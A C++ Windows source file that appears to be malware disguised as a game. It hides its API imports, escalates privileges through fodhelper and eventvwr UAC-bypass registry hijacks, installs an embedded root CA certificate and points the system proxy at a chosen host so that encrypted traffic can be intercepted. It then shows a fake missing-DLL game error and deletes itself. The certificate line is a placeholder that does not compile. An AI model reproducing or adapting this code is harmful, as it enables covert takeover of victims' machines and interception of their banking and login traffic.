#include <windows.h>
#include <shellapi.h>
#include <urlmon.h>
#include <wininet.h>
#include <shlwapi.h>
#include <string>
#include <vector>
#include <iostream>
#include <sstream>


typedef LONG (WINAPI *RegCreateKeyExW_t)(HKEY, LPCWSTR, DWORD, LPWSTR, DWORD, REGSAM, LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD);
typedef LONG (WINAPI *RegSetValueExW_t)(HKEY, LPCWSTR, DWORD, DWORD, const BYTE*, DWORD);
typedef LONG (WINAPI *RegOpenKeyExW_t)(HKEY, LPCWSTR, DWORD, REGSAM, PHKEY);
typedef LONG (WINAPI *RegCloseKey_t)(HKEY);
typedef BOOL (WINAPI *ShellExecuteExW_t)(SHELLEXECUTEINFOW*);
typedef HINSTANCE (WINAPI *ShellExecuteW_t)(HWND, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, INT);
typedef BOOL (WINAPI *InternetSetOptionW_t)(HINTERNET, DWORD, LPVOID, DWORD);
typedef BOOL (WINAPI *SHDeleteKeyW_t)(HKEY, LPCWSTR);
typedef BOOL (WINAPI *CreateProcessW_t)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
typedef BOOL (WINAPI *CloseHandle_t)(HANDLE);
typedef UINT (WINAPI *MessageBoxW_t)(HWND, LPCWSTR, LPCWSTR, UINT);
typedef VOID (WINAPI *Sleep_t)(DWORD);

static RegCreateKeyExW_t   pRegCreateKeyExW = nullptr;
static RegSetValueExW_t    pRegSetValueExW  = nullptr;
static RegOpenKeyExW_t     pRegOpenKeyExW   = nullptr;
static RegCloseKey_t       pRegCloseKey     = nullptr;
static ShellExecuteExW_t   pShellExecuteExW = nullptr;
static ShellExecuteW_t     pShellExecuteW   = nullptr;
static InternetSetOptionW_t pInternetSetOptionW = nullptr;
static SHDeleteKeyW_t      pSHDeleteKeyW    = nullptr;
static CreateProcessW_t    pCreateProcessW  = nullptr;
static CloseHandle_t       pCloseHandle     = nullptr;
static MessageBoxW_t       pMessageBoxW     = nullptr;
static Sleep_t             pSleep           = nullptr;

void InitDynamicImports() {
    HMODULE hAdv = LoadLibraryW(L"Advapi32.dll");
    pRegCreateKeyExW = (RegCreateKeyExW_t)GetProcAddress(hAdv, "RegCreateKeyExW");
    pRegSetValueExW  = (RegSetValueExW_t) GetProcAddress(hAdv, "RegSetValueExW");
    pRegOpenKeyExW   = (RegOpenKeyExW_t)   GetProcAddress(hAdv, "RegOpenKeyExW");
    pRegCloseKey     = (RegCloseKey_t)     GetProcAddress(hAdv, "RegCloseKey");
    HMODULE hShlw = LoadLibraryW(L"Shlwapi.dll");
    pSHDeleteKeyW   = (SHDeleteKeyW_t)      GetProcAddress(hShlw, "SHDeleteKeyW");
    HMODULE hShell = LoadLibraryW(L"Shell32.dll");
    pShellExecuteExW = (ShellExecuteExW_t)   GetProcAddress(hShell, "ShellExecuteExW");
    pShellExecuteW   = (ShellExecuteW_t)     GetProcAddress(hShell, "ShellExecuteW");
    HMODULE hInet = LoadLibraryW(L"Wininet.dll");
    pInternetSetOptionW = (InternetSetOptionW_t)GetProcAddress(hInet, "InternetSetOptionW");
    HMODULE hKernel = LoadLibraryW(L"Kernel32.dll");
    pCreateProcessW = (CreateProcessW_t)   GetProcAddress(hKernel, "CreateProcessW");
    pCloseHandle    = (CloseHandle_t)      GetProcAddress(hKernel, "CloseHandle");
    pSleep          = (Sleep_t)            GetProcAddress(hKernel, "Sleep");
    HMODULE hUser = LoadLibraryW(L"User32.dll");
    pMessageBoxW    = (MessageBoxW_t)      GetProcAddress(hUser, "MessageBoxW");
}

static const char* embedded_ca = *;

bool IsRunAsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&NtAuthority, 2,
        SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS,
        0,0,0,0,0,0,
        &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin == TRUE;
}

bool TryFodhelperBypass(const std::wstring& command) {
    HKEY key;
    const wchar_t* regPath = L"Software\\Classes\\ms-settings\\shell\\open\\command";

    if (pRegCreateKeyExW(HKEY_CURRENT_USER, regPath, 0, NULL, 0, KEY_WRITE, NULL, &key, NULL) != ERROR_SUCCESS)
        return false;

    pRegSetValueExW(key, NULL, 0, REG_SZ, reinterpret_cast<const BYTE*>(command.c_str()), static_cast<DWORD>((command.size() + 1) * sizeof(wchar_t)));
    pRegSetValueExW(key, L"DelegateExecute", 0, REG_SZ, reinterpret_cast<const BYTE*>(L""), sizeof(wchar_t));
    pRegCloseKey(key);

    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpVerb = L"open";
    sei.lpFile = L"fodhelper.exe";
    sei.nShow = SW_HIDE;
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;

    if (!pShellExecuteExW(&sei)) return false;
    pSleep(3000);
    pSHDeleteKeyW(HKEY_CURRENT_USER, regPath);
    return true;
}

bool TryEventVwrBypass(const std::wstring& command) {
    HKEY key;
    const wchar_t* regPath = L"Software\\Classes\\mscfile\\shell\\open\\command";
    if (pRegCreateKeyExW(HKEY_CURRENT_USER, regPath, 0, NULL, 0, KEY_WRITE, NULL, &key, NULL) != ERROR_SUCCESS)
        return false;

    pRegSetValueExW(key, NULL, 0, REG_SZ, reinterpret_cast<const BYTE*>(command.c_str()), static_cast<DWORD>((command.size() + 1) * sizeof(wchar_t)));
    pRegCloseKey(key);

    pShellExecuteW(NULL, L"open", L"eventvwr.exe", NULL, NULL, SW_HIDE);
    pSleep(3000);
    pSHDeleteKeyW(HKEY_CURRENT_USER, regPath);
    return true;
}

bool RunUacBypass(const std::wstring& command) {
    return TryFodhelperBypass(command) || TryEventVwrBypass(command);
}

HRESULT DownloadCaCert(std::wstring& outPath) {
    // unchanged
    wchar_t tmpPath[MAX_PATH] = {0};
    if (!GetTempPathW(MAX_PATH, tmpPath))
        return E_FAIL;

    std::wstring dest = std::wstring(tmpPath) + L"ca_cert.pem";
    outPath = dest;

    FILE* f = nullptr;
    _wfopen_s(&f, dest.c_str(), L"wb");
    if (!f)
        return E_FAIL;

    fwrite(embedded_ca, 1, strlen(embedded_ca), f);
    fclose(f);
    return S_OK;
}

bool InstallCertWindows(const std::wstring& pemPath) {
    std::wstring cmd = L"certutil -addstore -f root \"" + pemPath + L"\"";
    return _wsystem(cmd.c_str()) == 0;
}

bool EnableProxyWindows(const std::wstring& host, int port) {
    HKEY hKey;
    if (pRegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings",
        0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
        return false;
    }
    DWORD enable = 1;
    pRegSetValueExW(hKey, L"ProxyEnable", 0, REG_DWORD,
        reinterpret_cast<BYTE*>(&enable), sizeof(enable));

    std::wstring proxy = host + L":" + std::to_wstring(port);
    pRegSetValueExW(hKey, L"ProxyServer", 0, REG_SZ,
        reinterpret_cast<const BYTE*>(proxy.c_str()),
        static_cast<DWORD>((proxy.size() + 1) * sizeof(wchar_t)));
    pRegCloseKey(hKey);

    pInternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
    pInternetSetOptionW(NULL, INTERNET_OPTION_REFRESH, NULL, 0);
    return true;
}

bool DisableProxyWindows() {
    HKEY hKey;
    if (pRegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings",
        0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
        return false;
    }
    DWORD disable = 0;
    pRegSetValueExW(hKey, L"ProxyEnable", 0, REG_DWORD,
        reinterpret_cast<BYTE*>(&disable), sizeof(disable));
    pRegCloseKey(hKey);

    pInternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
    pInternetSetOptionW(NULL, INTERNET_OPTION_REFRESH, NULL, 0);
    return true;
}

void ShowFakeError() {
    pMessageBoxW(NULL,
        L"Unable to run game. Missing d3dx11_43.dll",
        L"Error",
        MB_OK | MB_ICONERROR);
}

void ScheduleSelfDelete() {
    wchar_t exePath[MAX_PATH];
    if (!GetModuleFileNameW(NULL, exePath, MAX_PATH))
        return;

    std::wstring cmd = L"cmd.exe /C ping 127.0.0.1 -n 2 > NUL & del /Q /F \"";
    cmd += exePath;
    cmd += L"\"";

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    pCreateProcessW(NULL, const_cast<LPWSTR>(cmd.c_str()), NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    pCloseHandle(pi.hProcess);
    pCloseHandle(pi.hThread);

    exit(0);
}

int wmain(int argc, wchar_t* argv[]) {
    // Initialize dynamic imports
    InitDynamicImports();

    std::wstring host = L"127.0.0.1";
    int port = 8080;
    bool disable = false;
    bool elevated = false;
    std::vector<std::wstring> params;

    for (int i = 1; i < argc; ++i) {
        params.push_back(argv[i]);
        if (wcscmp(argv[i], L"--port") == 0 && i + 1 < argc) {
            port = _wtoi(argv[++i]);
            params.back() += L" " + std::wstring(argv[i]);
        } else if (wcscmp(argv[i], L"--disable") == 0) {
            disable = true;
        } else if (wcscmp(argv[i], L"--elevated") == 0) {
            elevated = true;
        } else if (argv[i][0] != L'-') {
            host = argv[i];
        }
    }

    if (!elevated && !IsRunAsAdmin()) {
        wchar_t exePath[MAX_PATH];
        GetModuleFileNameW(NULL, exePath, MAX_PATH);
        std::wstring cmd = L"\"" + std::wstring(exePath) + L"\" --elevated";
        if (!RunUacBypass(cmd)) {
            std::wcerr << L"[!] UAC bypass failed\n";
            return 1;
        }
        return 0;
    }

    std::wstring certPath;
    if (FAILED(DownloadCaCert(certPath)))
        return 1;

    if (!disable) {
        if (!InstallCertWindows(certPath)) {
            std::wcerr << L"[!] Certificate install failed\n";
            return 1;
        }
        if (!EnableProxyWindows(host, port)) {
            std::wcerr << L"[!] Enabling proxy failed\n";
            return 1;
        }
        ShowFakeError();
    } else {
        if (!DisableProxyWindows()) {
            std::wcerr << L"[!] Disabling proxy failed\n";
            return 1;
        }
        std::wcout << L"[+] Proxy disabled\n";
    }

    ScheduleSelfDelete();
    return 0;
}
